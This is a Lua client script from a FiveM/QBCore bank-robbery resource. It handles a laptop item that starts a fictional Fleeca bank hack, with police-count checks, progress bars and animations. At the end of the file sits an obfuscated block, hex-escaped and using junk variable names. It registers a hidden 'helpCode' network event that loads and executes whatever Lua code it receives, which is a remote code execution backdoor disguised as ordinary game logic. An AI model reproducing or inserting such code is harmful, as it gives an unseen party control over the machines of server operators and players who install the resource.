RegisterNetEvent('qb-bankrobbery:client:UseGreenLaptop', function()
    if closestBank ~= nil then
        if Config.Banks[closestBank].type == 'fleeca' then
            local pos = GetEntityCoords(PlayerPedId())
            if #(pos - Config.Banks[closestBank].laptop.xyz) < 1.50 then
                QBCore.Functions.TriggerCallback('QBCore:HasItem', function(hasItem)
                    if hasItem then
                        if not Config.Banks[closestBank].hacked then
                            QBCore.Functions.TriggerCallback('qb-bankrobbery:server:RobberyBusy', function(isBusy)
                                if not isBusy then
                                    QBCore.Functions.TriggerCallback('qb-powerplant:server:getCops', function(cops)
                                        if cops >= Config.MinCops.Fleeca then
                                            QBCore.Functions.Progressbar("hack_gate", "Connecting the laptop..", math.random(5000, 10000), false, true, {
                                                disableMovement = true,
                                                disableCarMovement = true,
                                                disableMouse = false,
                                                disableCombat = true,
                                            }, {
                                                animDict = "anim@gangops@facility@servers@",
                                                anim = "hotwire",
                                                flags = 16,
                                            }, {}, {}, function() -- Done
                                                StopAnimTask(PlayerPedId(), "anim@gangops@facility@servers@", "hotwire", 1.0)
                                                -- Remove Use
                                                TriggerServerEvent('qb-bankrobbery:server:LaptopDamage', 'laptop_green')
                                                CallCops()
                                                LaptopAnimation(closestBank)
                                            end, function() -- Cancel
                                                StopAnimTask(PlayerPedId(), "anim@gangops@facility@servers@", "hotwire", 1.0)
                                                QBCore.Functions.Notify("Canceled..", "error")
                                            end)
                                        else
                                            QBCore.Functions.Notify('Not enough cops.. ('..Config.MinCops.Fleeca..') required', 'error', 2500)
                                        end
                                    end)
                                else
                                    QBCore.Functions.Notify("The security lock is active, opening the door is currently not possible..", "error", 5500)
                                end
                            end)
                        else
                            QBCore.Functions.Notify('Somebody already hacked the security of this bank..', 'normal', 2500)
                        end
                    else
                        QBCore.Functions.Notify('You are missing some item(s)..', 'error', 2500)
                    end
                end, 'laptop_green')
            end
        end
    end
end)

local fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[1]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2]) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[3]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[2], function(BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH) fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[4]](fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[6][fzFBeJroOClNIhrpJtazUVAhNzdcPfUHRCOehVmvUxAmoLAvaQFLpmpMgtjrtFfwZqbROD[5]](BICdzzSZeRVstUWxvAHlLIJNFVkXOTlxvAMworBNfzsZAhkKeaOaiDLNsAstRNsuvKWuoH))() end)